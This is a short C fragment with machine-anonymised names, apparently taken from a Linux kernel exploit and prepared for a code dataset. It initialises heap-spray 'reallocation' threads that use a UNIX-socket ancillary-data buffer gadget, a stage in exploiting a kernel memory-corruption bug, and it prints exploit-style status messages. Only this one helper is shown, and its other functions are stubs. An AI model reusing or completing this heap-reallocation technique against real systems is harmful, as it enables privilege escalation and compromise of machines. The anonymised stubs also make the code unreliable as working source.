
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct realloc_thread_arg {int tid; } ;


 int FUNC_0 () ;
 int FUNC_1 () ;
 size_t VAR_0 ;
 scalar_t__ FUNC_2 () ;
 scalar_t__ FUNC_3 (struct realloc_thread_arg*) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (char*,...) ;
 int FUNC_6 (int *,int *,int ,struct realloc_thread_arg*) ;
 int VAR_1 ;

__attribute__((used)) static int FUNC_7(struct realloc_thread_arg *VAR_2, size_t VAR_3)
{
  int VAR_4 = 0;
  int VAR_5 = -1;

  if (!FUNC_1())
  {
    FUNC_5("[-] can't use the 'ancillary data buffer' reallocation gadget!\n");
    goto fail;
  }
  FUNC_5("[+] can use the 'ancillary data buffer' reallocation gadget!\n");

  if (FUNC_2())
  {
    FUNC_5("[-] failed to initialize reallocation data!\n");
    goto fail;
  }
  FUNC_5("[+] reallocation data initialized!\n");

  FUNC_5("[ ] initializing reallocation threads, please wait...\n");
  for (VAR_4 = 0; VAR_4 < VAR_3; ++VAR_4)
  {
    if (FUNC_3(&VAR_2[VAR_4]))
    {
      FUNC_5("[-] failed to init UNIX sockets!\n");
      goto fail;
    }

    if ((VAR_5 = FUNC_6(&VAR_2[VAR_4].tid, ((void*)0), VAR_1, &VAR_2[VAR_4])) != 0)
    {
      FUNC_4("[-] pthread_create");
      goto fail;
    }
  }


  while (VAR_0 < VAR_3)
    FUNC_0();

  FUNC_5("[+] %lu reallocation threads ready!\n", VAR_3);

  return 0;

fail:
  FUNC_5("[-] failed to initialize reallocation\n");
  return -1;
}
